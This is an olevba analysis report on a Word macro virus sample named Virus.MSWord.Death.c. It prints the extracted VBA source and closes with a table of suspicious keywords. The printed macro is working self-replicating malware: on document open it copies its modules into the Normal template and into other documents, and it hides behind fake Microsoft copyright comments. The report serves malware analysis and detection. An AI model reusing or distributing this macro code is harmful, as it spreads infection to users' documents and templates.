olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Death.c-d8dd96444a3a5d0e354f0f5d137453d27089cc1a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Death.c-d8dd96444a3a5d0e354f0f5d137453d27089cc1a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AddString.bas 
in file: Virus.MSWord.Death.c-d8dd96444a3a5d0e354f0f5d137453d27089cc1a - OLE stream: 'Macros/VBA/AddString'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'The Microsoft Word Language Visual Basic
'Copyright (c) 1999 Microsoft
'Todos os direitos reservados
Public pq As String



Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Microsoft Word (c) 1999 Corporation\r\nInternet Mail"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Web.AddString.AutoOpen"
 Call AddFile
 Call AddNew
 'Call MailNew
 'Call Verday
End Sub
 
Sub AddNew()
Attribute AddNew.VB_Description = "Microsoft Word (c) 1999 Corporation\r\nInternet Mail"
Attribute AddNew.VB_ProcData.VB_Invoke_Func = "Web.AddString.AddNew"
Dim exec
exec = Counter()

On Error GoTo 0
Open pq + "\Death Kiss.Ini" For Output As 1
Print #1, exec + 1
Close #1

Doc = ActiveDocument.Path + "\" + ActiveDocument.Name
dot = NormalTemplate.FullName

On Error Resume Next

Application.OrganizerCopy Source:=Doc, _
       Destination:=NormalTemplate.FullName, Name:="AddString", _
       Object:=wdOrganizerObjectProjectItems

Application.OrganizerCopy Source:=Doc, _
       Destination:=NormalTemplate.FullName, Name:="AddMail", _
       Object:=wdOrganizerObjectProjectItems

On Error GoTo 0
On Error Resume Next

Application.OrganizerCopy Source:=dot, _
       Destination:=Doc, Name:="AddString", _
       Object:=wdOrganizerObjectProjectItems

Application.OrganizerCopy Source:=dot, _
       Destination:=ActiveDocument.Name, Name:="AddMail", _
       Object:=wdOrganizerObjectProjectItems

On Error GoTo 0

End Sub

Function Counter()
Dim exec
exec = ""
On Error Resume Next
Open pq + "\Death Kiss.Ini" For Input As #1
Input #1, exec
Close #1
On Error GoTo 0
Counter = Val(exec)
End Function

Function AddFile()
Dim meucar As String
cdir = CurDir()

On Error Resume Next
  ChDir "\"
  MkDir "\Windows"
On Error GoTo 0

On Error Resume Next
ChDir "\Windows"
MkDir "Application Users"
On Error GoTo 0

On Error Resume Next
ChDir "\Windows\Application Users"
MkDir "AddFile"
On Error GoTo 0

ChDir cdir
pq = "\Windows\Application Users\AddFile"
On Error GoTo 0

p = ActiveDocument.Path + "\Pesquisa de Opinião.doc"

If Counter() = 0 Then
   On Error Resume Next
   Open p For Binary As #1
   Do While Meulocal < LOF(1)
       meucar = meucar & Input(2048, #1)
       Meulocal = Loc(1)
   Loop
   Close #1

   Open pq + "\Pesquisa de Opinião.doc" For Binary Access Write As #1
   Put #1, , meucar
   Close #1
   On Error GoTo 0
End If
End Function

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|exec                |May run an executable file or a system       |
|          |                    |command using Excel 4 Macros (XLM/XLF)       |
+----------+--------------------+---------------------------------------------+

